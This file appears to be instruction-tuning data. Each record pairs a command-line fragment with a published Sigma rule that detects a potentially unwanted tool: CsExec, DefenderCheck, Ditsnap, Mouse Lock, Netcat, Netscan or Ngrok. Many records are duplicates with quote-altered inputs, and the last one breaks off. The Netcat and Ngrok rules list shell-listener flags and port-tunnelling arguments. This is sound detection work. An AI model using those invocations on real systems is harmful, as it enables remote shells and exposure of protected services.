{"instruction": "Write Sigma rule to detect payload:", "input": "\\csexec.exe", "output": "title: PUA - CsExec Execution\nid: d08a2711-ee8b-4323-bdec-b7d85e892b31\nstatus: test\ndescription: Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative\nreferences:\n    - https://github.com/malcomvetter/CSExec\n    - https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-21\ntags:\n    - attack.resource-development\n    - attack.t1587.001\n    - attack.execution\n    - attack.t1569.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DefenderCheck.exe", "output": "title: PUA - DefenderCheck Execution\nid: f0ca6c24-3225-47d5-b1f5-352bf07ecfa7\nstatus: test\ndescription: Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\nreferences:\n    - https://github.com/matterpreter/DefenderCheck\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-30\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\DefenderCheck.exe\"", "output": "title: PUA - DefenderCheck Execution\nid: f0ca6c24-3225-47d5-b1f5-352bf07ecfa7\nstatus: test\ndescription: Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\nreferences:\n    - https://github.com/matterpreter/DefenderCheck\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-30\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DefenderCheck", "output": "title: PUA - DefenderCheck Execution\nid: f0ca6c24-3225-47d5-b1f5-352bf07ecfa7\nstatus: test\ndescription: Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\nreferences:\n    - https://github.com/matterpreter/DefenderCheck\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-30\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DefenderCheck.exe", "output": "title: PUA - DefenderCheck Execution\nid: f0ca6c24-3225-47d5-b1f5-352bf07ecfa7\nstatus: test\ndescription: Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.\nreferences:\n    - https://github.com/matterpreter/DefenderCheck\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-30\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ditsnap.exe ditsnap.exe", "output": "title: PUA - DIT Snapshot Viewer\nid: d3b70aad-097e-409c-9df2-450f80dc476b\nstatus: test\ndescription: Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\nreferences:\n    - https://thedfirreport.com/2020/06/21/snatch-ransomware/\n    - https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap\nauthor: Furkan Caliskan (@caliskanfurkan_)\ndate: 2020-07-04\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\ditsnap.exe\\\" ditsnap.exe", "output": "title: PUA - DIT Snapshot Viewer\nid: d3b70aad-097e-409c-9df2-450f80dc476b\nstatus: test\ndescription: Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\nreferences:\n    - https://thedfirreport.com/2020/06/21/snatch-ransomware/\n    - https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap\nauthor: Furkan Caliskan (@caliskanfurkan_)\ndate: 2020-07-04\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ditsnap ditsnap", "output": "title: PUA - DIT Snapshot Viewer\nid: d3b70aad-097e-409c-9df2-450f80dc476b\nstatus: test\ndescription: Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\nreferences:\n    - https://thedfirreport.com/2020/06/21/snatch-ransomware/\n    - https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap\nauthor: Furkan Caliskan (@caliskanfurkan_)\ndate: 2020-07-04\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ditsnap.exe ditsnap.exe", "output": "title: PUA - DIT Snapshot Viewer\nid: d3b70aad-097e-409c-9df2-450f80dc476b\nstatus: test\ndescription: Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.\nreferences:\n    - https://thedfirreport.com/2020/06/21/snatch-ransomware/\n    - https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap\nauthor: Furkan Caliskan (@caliskanfurkan_)\ndate: 2020-07-04\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\ditsnap.exe'\n        - CommandLine|contains: 'ditsnap.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate admin usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Mouse Lock_", "output": "title: PUA - Mouse Lock Execution\nid: c9192ad9-75e5-43eb-8647-82a0a5b493e3\nstatus: test\ndescription: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.\nreferences:\n    - https://github.com/klsecservices/Publications/blob/657deb6a6eb6e00669afd40173f425fb49682eaa/Incident-Response-Analyst-Report-2020.pdf\n    - https://sourceforge.net/projects/mouselock/\nauthor: Cian Heasley\ndate: 2020-08-13\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1056.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Product|contains: 'Mouse Lock'\n        - Company|contains: 'Misc314'\n        - CommandLine|contains: 'Mouse Lock_'\n    condition: selection\nfields:\n    - Product\n    - Company\n    - CommandLine\nfalsepositives:\n    - Legitimate uses of Mouse Lock software\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Mouse Lo\"ck_\"", "output": "title: PUA - Mouse Lock Execution\nid: c9192ad9-75e5-43eb-8647-82a0a5b493e3\nstatus: test\ndescription: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.\nreferences:\n    - https://github.com/klsecservices/Publications/blob/657deb6a6eb6e00669afd40173f425fb49682eaa/Incident-Response-Analyst-Report-2020.pdf\n    - https://sourceforge.net/projects/mouselock/\nauthor: Cian Heasley\ndate: 2020-08-13\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1056.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Product|contains: 'Mouse Lock'\n        - Company|contains: 'Misc314'\n        - CommandLine|contains: 'Mouse Lock_'\n    condition: selection\nfields:\n    - Product\n    - Company\n    - CommandLine\nfalsepositives:\n    - Legitimate uses of Mouse Lock software\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Mouse Lock_", "output": "title: PUA - Mouse Lock Execution\nid: c9192ad9-75e5-43eb-8647-82a0a5b493e3\nstatus: test\ndescription: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.\nreferences:\n    - https://github.com/klsecservices/Publications/blob/657deb6a6eb6e00669afd40173f425fb49682eaa/Incident-Response-Analyst-Report-2020.pdf\n    - https://sourceforge.net/projects/mouselock/\nauthor: Cian Heasley\ndate: 2020-08-13\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1056.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Product|contains: 'Mouse Lock'\n        - Company|contains: 'Misc314'\n        - CommandLine|contains: 'Mouse Lock_'\n    condition: selection\nfields:\n    - Product\n    - Company\n    - CommandLine\nfalsepositives:\n    - Legitimate uses of Mouse Lock software\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nc.exe \\ncat.exe \\netcat.exe -lvp -lvnp -l -v -p -lv -p -l --proxy-type http -vnl --exec -vnl -e --lua-exec --sh-exec", "output": "title: PUA - Netcat Suspicious Execution\nid: e31033fc-33f0-4020-9a16-faf9b31cbf08\nstatus: test\ndescription: Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nreferences:\n    - https://nmap.org/ncat/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\n    - https://www.revshells.com/\nauthor: frack113, Florian Roth (Nextron Systems)\ndate: 2021-07-21\nmodified: 2023-02-08\ntags:\n    - attack.command-and-control\n    - attack.t1095\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # can not use OriginalFileName as is empty\n        Image|endswith:\n            - '\\nc.exe'\n            - '\\ncat.exe'\n            - '\\netcat.exe'\n    selection_cmdline:\n        # Typical command lines\n        CommandLine|contains:\n            - ' -lvp '\n            - ' -lvnp'\n            - ' -l -v -p '\n            - ' -lv -p '\n            - ' -l --proxy-type http '\n            # - ' --exec cmd.exe ' # Not specific enough for netcat\n            - ' -vnl --exec '\n            - ' -vnl -e '\n            - ' --lua-exec '\n            - ' --sh-exec '\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate ncat use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nc.exe \\ncat.exe \\netcat.exe -lvp -lvnp -l -v -p -lv -p -l --proxy-type http -vnl --e\\\"xec\\\" -vnl -e --lua-exec --sh-exec", "output": "title: PUA - Netcat Suspicious Execution\nid: e31033fc-33f0-4020-9a16-faf9b31cbf08\nstatus: test\ndescription: Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nreferences:\n    - https://nmap.org/ncat/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\n    - https://www.revshells.com/\nauthor: frack113, Florian Roth (Nextron Systems)\ndate: 2021-07-21\nmodified: 2023-02-08\ntags:\n    - attack.command-and-control\n    - attack.t1095\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # can not use OriginalFileName as is empty\n        Image|endswith:\n            - '\\nc.exe'\n            - '\\ncat.exe'\n            - '\\netcat.exe'\n    selection_cmdline:\n        # Typical command lines\n        CommandLine|contains:\n            - ' -lvp '\n            - ' -lvnp'\n            - ' -l -v -p '\n            - ' -lv -p '\n            - ' -l --proxy-type http '\n            # - ' --exec cmd.exe ' # Not specific enough for netcat\n            - ' -vnl --exec '\n            - ' -vnl -e '\n            - ' --lua-exec '\n            - ' --sh-exec '\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate ncat use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nc \\ncat \\netcat -lvp -lvnp -l -v -p -lv -p -l --proxy-type http -vnl --exec -vnl -e --lua-exec --sh-exec", "output": "title: PUA - Netcat Suspicious Execution\nid: e31033fc-33f0-4020-9a16-faf9b31cbf08\nstatus: test\ndescription: Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nreferences:\n    - https://nmap.org/ncat/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\n    - https://www.revshells.com/\nauthor: frack113, Florian Roth (Nextron Systems)\ndate: 2021-07-21\nmodified: 2023-02-08\ntags:\n    - attack.command-and-control\n    - attack.t1095\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # can not use OriginalFileName as is empty\n        Image|endswith:\n            - '\\nc.exe'\n            - '\\ncat.exe'\n            - '\\netcat.exe'\n    selection_cmdline:\n        # Typical command lines\n        CommandLine|contains:\n            - ' -lvp '\n            - ' -lvnp'\n            - ' -l -v -p '\n            - ' -lv -p '\n            - ' -l --proxy-type http '\n            # - ' --exec cmd.exe ' # Not specific enough for netcat\n            - ' -vnl --exec '\n            - ' -vnl -e '\n            - ' --lua-exec '\n            - ' --sh-exec '\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate ncat use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nc.exe \\ncat.exe \\netcat.exe -lvp -lvnp -l -v -p -lv -p -l --proxy-type http -vnl --exec -vnl -e --lua-exec --sh-exec", "output": "title: PUA - Netcat Suspicious Execution\nid: e31033fc-33f0-4020-9a16-faf9b31cbf08\nstatus: test\ndescription: Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nreferences:\n    - https://nmap.org/ncat/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\n    - https://www.revshells.com/\nauthor: frack113, Florian Roth (Nextron Systems)\ndate: 2021-07-21\nmodified: 2023-02-08\ntags:\n    - attack.command-and-control\n    - attack.t1095\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        # can not use OriginalFileName as is empty\n        Image|endswith:\n            - '\\nc.exe'\n            - '\\ncat.exe'\n            - '\\netcat.exe'\n    selection_cmdline:\n        # Typical command lines\n        CommandLine|contains:\n            - ' -lvp '\n            - ' -lvnp'\n            - ' -l -v -p '\n            - ' -lv -p '\n            - ' -l --proxy-type http '\n            # - ' --exec cmd.exe ' # Not specific enough for netcat\n            - ' -vnl --exec '\n            - ' -vnl -e '\n            - ' --lua-exec '\n            - ' --sh-exec '\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate ncat use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netscan.exe", "output": "title: PUA - SoftPerfect Netscan Execution\nid: ca387a8e-1c84-4da3-9993-028b45342d30\nstatus: test\ndescription: |\n    Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\n    It is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\nreferences:\n    - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-netscan/\n    - https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf\n    - https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/yanluowang-ransomware-attacks-continue\n    - https://research.nccgroup.com/2022/07/13/climbing-mount-everest-black-byte-bytes-back/\n    - https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-to-deploy-hive-ransomware/\n    - https://www.softperfect.com/products/networkscanner/\nauthor: '@d4ns4n_ (Wuerth-Phoenix)'\ndate: 2024-04-25\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\netscan.exe'\n        - Product: 'Network Scanner'\n        - Description: 'Application for scanning networks'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\netscan.exe\"", "output": "title: PUA - SoftPerfect Netscan Execution\nid: ca387a8e-1c84-4da3-9993-028b45342d30\nstatus: test\ndescription: |\n    Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\n    It is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\nreferences:\n    - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-netscan/\n    - https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf\n    - https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/yanluowang-ransomware-attacks-continue\n    - https://research.nccgroup.com/2022/07/13/climbing-mount-everest-black-byte-bytes-back/\n    - https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-to-deploy-hive-ransomware/\n    - https://www.softperfect.com/products/networkscanner/\nauthor: '@d4ns4n_ (Wuerth-Phoenix)'\ndate: 2024-04-25\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\netscan.exe'\n        - Product: 'Network Scanner'\n        - Description: 'Application for scanning networks'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netscan", "output": "title: PUA - SoftPerfect Netscan Execution\nid: ca387a8e-1c84-4da3-9993-028b45342d30\nstatus: test\ndescription: |\n    Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\n    It is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\nreferences:\n    - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-netscan/\n    - https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf\n    - https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/yanluowang-ransomware-attacks-continue\n    - https://research.nccgroup.com/2022/07/13/climbing-mount-everest-black-byte-bytes-back/\n    - https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-to-deploy-hive-ransomware/\n    - https://www.softperfect.com/products/networkscanner/\nauthor: '@d4ns4n_ (Wuerth-Phoenix)'\ndate: 2024-04-25\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\netscan.exe'\n        - Product: 'Network Scanner'\n        - Description: 'Application for scanning networks'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netscan.exe", "output": "title: PUA - SoftPerfect Netscan Execution\nid: ca387a8e-1c84-4da3-9993-028b45342d30\nstatus: test\ndescription: |\n    Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\n    It is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\nreferences:\n    - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-netscan/\n    - https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf\n    - https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/yanluowang-ransomware-attacks-continue\n    - https://research.nccgroup.com/2022/07/13/climbing-mount-everest-black-byte-bytes-back/\n    - https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-to-deploy-hive-ransomware/\n    - https://www.softperfect.com/products/networkscanner/\nauthor: '@d4ns4n_ (Wuerth-Phoenix)'\ndate: 2024-04-25\ntags:\n    - attack.discovery\n    - attack.t1046\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\netscan.exe'\n        - Product: 'Network Scanner'\n        - Description: 'Application for scanning networks'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tcp 139 tcp 445 tcp 3389 tcp 5985 tcp 5986 start --all --config .yml ngrok.exe tcp http authtoken .exe authtoken .exe start --all", "output": "title: PUA - Ngrok Execution\nid: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31\nstatus: test\ndescription: |\n  Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\n  Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\nreferences:\n    - https://ngrok.com/docs\n    - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n    - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp\n    - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection\n    - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/\n    - https://twitter.com/xorJosh/status/1598646907802451969\n    - https://www.softwaretestinghelp.com/how-to-use-ngrok/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-14\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - ' tcp 139'\n            - ' tcp 445'\n            - ' tcp 3389'\n            - ' tcp 5985'\n            - ' tcp 5986'\n    selection2:\n        CommandLine|contains|all:\n            - ' start '\n            - '--all'\n            - '--config'\n            - '.yml'\n    selection3:\n        Image|endswith: 'ngrok.exe'\n        CommandLine|contains:\n            - ' tcp '\n            - ' http '\n            - ' authtoken '\n    selection4:\n        CommandLine|contains:\n            - '.exe authtoken '\n            - '.exe start --all'\n    condition: 1 of selection*\nfalsepositives:\n    - Another tool that uses the command line switches of Ngrok\n    - Ngrok http 3978 (https://learn.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tcp 1\"39\" tcp 445 tcp 3389 tcp 5985 tcp 5986 start --all --config .yml ngrok.exe tcp http authtoken .exe authtoken .exe start --all", "output": "title: PUA - Ngrok Execution\nid: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31\nstatus: test\ndescription: |\n  Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\n  Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\nreferences:\n    - https://ngrok.com/docs\n    - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n    - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp\n    - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection\n    - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/\n    - https://twitter.com/xorJosh/status/1598646907802451969\n    - https://www.softwaretestinghelp.com/how-to-use-ngrok/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-14\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - ' tcp 139'\n            - ' tcp 445'\n            - ' tcp 3389'\n            - ' tcp 5985'\n            - ' tcp 5986'\n    selection2:\n        CommandLine|contains|all:\n            - ' start '\n            - '--all'\n            - '--config'\n            - '.yml'\n    selection3:\n        Image|endswith: 'ngrok.exe'\n        CommandLine|contains:\n            - ' tcp '\n            - ' http '\n            - ' authtoken '\n    selection4:\n        CommandLine|contains:\n            - '.exe authtoken '\n            - '.exe start --all'\n    condition: 1 of selection*\nfalsepositives:\n    - Another tool that uses the command line switches of Ngrok\n    - Ngrok http 3978 (https://learn.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tcp 139 tcp 445 tcp 3389 tcp 5985 tcp 5986 start --all --config .yml ngrok tcp http authtoken authtoken start --all", "output": "title: PUA - Ngrok Execution\nid: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31\nstatus: test\ndescription: |\n  Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\n  Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\nreferences:\n    - https://ngrok.com/docs\n    - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n    - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp\n    - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection\n    - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/\n    - https://twitter.com/xorJosh/status/1598646907802451969\n    - https://www.softwaretestinghelp.com/how-to-use-ngrok/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-14\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - ' tcp 139'\n            - ' tcp 445'\n            - ' tcp 3389'\n            - ' tcp 5985'\n            - ' tcp 5986'\n    selection2:\n        CommandLine|contains|all:\n            - ' start '\n            - '--all'\n            - '--config'\n            - '.yml'\n    selection3:\n        Image|endswith: 'ngrok.exe'\n        CommandLine|contains:\n            - ' tcp '\n            - ' http '\n            - ' authtoken '\n    selection4:\n        CommandLine|contains:\n            - '.exe authtoken '\n            - '.exe start --all'\n    condition: 1 of selection*\nfalsepositives:\n    - Another tool that uses the command line switches of Ngrok\n    - Ngrok http 3978 (https://learn.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tcp 139 tcp 445 tcp 3389 tcp 5985 tcp 5986 start --all --config .yml ngrok.exe tcp http authtoken .exe authtoken .exe start --all", "output": "title: PUA - Ngrok Execution\nid: ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31\nstatus: test\ndescription: |\n  Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\n  Involved domains are bin.equinox.io for download and *.ngrok.io for connections.\nreferences:\n    - https://ngrok.com/docs\n    - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n    - https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp\n    - https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection\n    - https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/\n    - https://twitter.com/xorJosh/status/1598646907802451969\n    - https://www.softwaretestinghelp.com/how-to-use-ngrok/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-14\nmodified: 2023-02-21\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - ' tcp 139'\n            - ' tcp 445'\n            - ' tcp 3389'\n            - ' tcp 5985'\n            - ' tcp 5986'\n    selection2:\n        CommandLine|contains|all:\n            - ' start '\n            - '--all'\n            - '--config'\n            - '.yml'\n    selection3:\n        Image|endswith: 'ngrok.exe'\n        CommandLine|contains:\n            - ' tcp '\n            - ' http '\n            - ' authtoken '\n    selection4:\n        CommandLine|contains:\n            - '.exe authtoken '\n            - '.exe start --all'\n    condition: 1 of selection*\nfalsepositives:\n    - Another tool that uses the command line switches of Ngrok\n    - Ngrok http 3978 